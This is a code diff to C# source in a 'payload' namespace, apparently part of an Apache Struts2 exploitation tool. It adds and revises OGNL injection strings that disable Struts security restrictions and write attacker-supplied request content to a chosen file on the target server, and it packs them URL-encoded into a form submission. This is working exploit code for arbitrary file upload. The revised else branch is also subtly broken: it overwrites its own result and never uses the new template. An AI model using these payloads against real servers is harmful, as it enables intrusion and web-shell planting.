@@ -19,7 +19,9 @@ namespace payload
         //private String Exp_Upload = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(new java.io.BufferedWriter(new java.io.FileWriter([path])).append(#req.getHeader('test')).close()).(#res.getWriter().print('oko')).(#res.getWriter().print('kok/')).(#res.getWriter().print(#req.getContextPath())).(#res.getWriter().flush()).(#res.getWriter().close())}";
         //private String Exp_Upload = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(new java.io.BufferedWriter(new java.io.FileWriter([path])).append(new java.net.URLDecoder().decode(#req.getHeader('test'),'UTF-8')).close()).(#res.getWriter().print('oko')).(#res.getWriter().print('kok/')).(#res.getWriter().print(#req.getContextPath())).(#res.getWriter().flush()).(#res.getWriter().close())}";
         //大文件
-        private String Exp_Upload = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('start:')).(#fs=new java.io.FileOutputStream([path])).(#out=#res.getOutputStream()).(@org.apache.commons.io.IOUtils@copy(#req.getInputStream(),#fs)).(#fs.close()).(#out.print('oko')).(#out.print('kok/:end')).(#out.print(#req.getContextPath())).(#out.close())}";
+        private String Exp_Upload = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('start:')).(#fs=new java.io.FileOutputStream(#req.getSession().getServletContext().getRealPath('/[pathfilename]'))).(#out=#res.getOutputStream()).(@org.apache.commons.io.IOUtils@copy(#req.getInputStream(),#fs)).(#fs.close()).(#out.print('oko')).(#out.print('kok/:end')).(#out.print(#req.getContextPath())).(#out.close())}";
+
+        private String Exp_SetMyUpload = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('start:')).(new java.io.File('[path]').mkdirs()).(#fs=new java.io.FileOutputStream('[pathfilename]')).(#out=#res.getOutputStream()).(@org.apache.commons.io.IOUtils@copy(#req.getInputStream(),#fs)).(#fs.close()).(#out.print('oko')).(#out.print('kok/:end')).(#out.print(#req.getContextPath())).(#out.close())}";
 
         public String Get_Exp_Check()
         {
@@ -41,16 +43,18 @@ namespace payload
         }
         public String Get_Exp_Upload(String path,String fileName,String fileContent)
         {
+            String data = "";
             if ("".Equals(path))
             {
-                path = "#req.getSession().getServletContext().getRealPath('/"+fileName+"')";
-                this.Exp_Upload = this.Exp_Upload.Replace("[path]", path);
+                this.Exp_Upload = this.Exp_Upload.Replace("[pathfilename]", fileName);
+                data= this.Exp_Upload.Replace("[filecontent]", fileContent);
             }
-            else {
-                this.Exp_Upload = this.Exp_Upload.Replace("[path]", "'"+path+ "'");
+            else
+            {
+                this.Exp_SetMyUpload = this.Exp_Upload.Replace("[path]", path);
+                this.Exp_SetMyUpload = this.Exp_Upload.Replace("[pathfilename]", path + "/" + fileName);
+                data=this.Exp_SetMyUpload.Replace("[filecontent]", fileContent);
             }
-            String data =this.Exp_Upload.Replace("[filecontent]", fileContent);
-
             return String.Format("name={0}&age=a&__checkbox_bustedBefore=true&description=s", System.Web.HttpUtility.UrlEncode(data));
         }
     }
